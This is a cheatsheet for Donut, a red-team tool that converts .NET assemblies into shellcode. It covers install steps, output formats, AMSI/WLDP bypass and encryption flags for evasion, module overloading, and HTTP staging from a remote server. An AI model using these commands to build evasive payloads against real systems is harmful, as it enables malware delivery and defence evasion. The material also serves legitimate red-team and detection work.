# Donut Cheatsheet

## Quick Reference

### Installation

```bash
# From source
git clone https://github.com/TheWover/donut.git && cd donut && make

# Python module
pip3 install donut-shellcode

# Docker
docker build -t donut .
```

### Basic Usage

```bash
# Generate .NET shellcode
donut -f 1 -o payload.bin MyTool.exe

# 64-bit only
donut -a 2 -f 1 -o payload64.bin MyTool.exe

# x86+amd64 (default)
donut -a 3 -f 1 -o payload.bin MyTool.exe

# Maximum evasion
donut -e 3 -f 1 -o encrypted.bin MyTool.exe
```

### Python Module

```python
import donut
shellcode = donut.create(file="MyTool.exe")
with open("payload.bin", "wb") as f:
    f.write(shellcode)
```

### Output Formats

| Flag | Format | Description |
|------|--------|-------------|
| `-f 1` | Binary | Raw shellcode |
| `-f 2` | Base64 | Text-encoded |
| `-f 3` | C | C byte array |
| `-f 4` | Ruby | Ruby byte string |
| `-f 5` | Python | Python byte string |
| `-f 6` | PowerShell | PS script |
| `-f 7` | C# | C# byte array |
| `-f 8` | Hex | Hex string |

### Key Flags

| Flag | Description |
|------|-------------|
| `-a` | Architecture: 1=x86, 2=amd64, 3=both |
| `-b` | AMSI/WLDP bypass: 1=none, 2=abort, 3=continue |
| `-c` | .NET class name (for DLLs) |
| `-d` | AppDomain name |
| `-e` | Entropy: 1=none, 2=random names, 3=encryption |
| `-f` | Output format |
| `-j` | Decoy module for overloading |
| `-k` | PE headers: 1=overwrite, 2=keep |
| `-m` | Method name (for DLLs) |
| `-n` | Module name for staging |
| `-o` | Output path |
| `-p` | Parameters |
| `-r` | CLR version |
| `-s` | HTTP staging server URL |
| `-t` | Run as thread |
| `-x` | Exit: 1=thread, 2=process, 3=block |
| `-y` | Resume offset |
| `-z` | Compression: 1=none, 2=aPLib, 3=LZNT1 |

### HTTP Staging

```bash
donut -a 3 -s http://192.168.1.100/ -n loader.dat -f 1 -o stager.bin MyTool.exe
```

### .NET DLL Execution

```bash
donut -c "Namespace.Class" -m "MethodName" -f 1 -o payload.bin MyPlugin.dll
```

### Compression

```bash
donut -z 2 -f 1 -o compressed.bin MyTool.exe  # aPLib
donut -z 3 -f 1 -o compressed.bin MyTool.exe  # LZNT1 (Windows)
donut -z 5 -f 1 -o compressed.bin MyTool.exe  # Xpress Huffman
```

### Module Overloading

```bash
donut -j C:\Windows\System32\ntdll.dll -f 1 -o loader.bin MyTool.exe
```

### Exit Behaviors

| Value | Behavior |
|-------|----------|
| 1 | Exit thread (default, for injection) |
| 2 | Exit process (standalone) |
| 3 | Block indefinitely (persistent) |

### .NET Requirements

- Entry point: `public static` method
- Arguments: strings only or none
- Class: `public`
- Must be pure managed (not Mixed)

### Troubleshooting

```bash
# Build fails
sudo apt -y install build-essential gcc make

# CLR version mismatch
donut -r v4.0.30319 -f 1 -o payload.bin MyTool.exe

# Payload too large — use compression or staging
donut -z 5 -f 1 -o small.bin LargeAssembly.exe
```
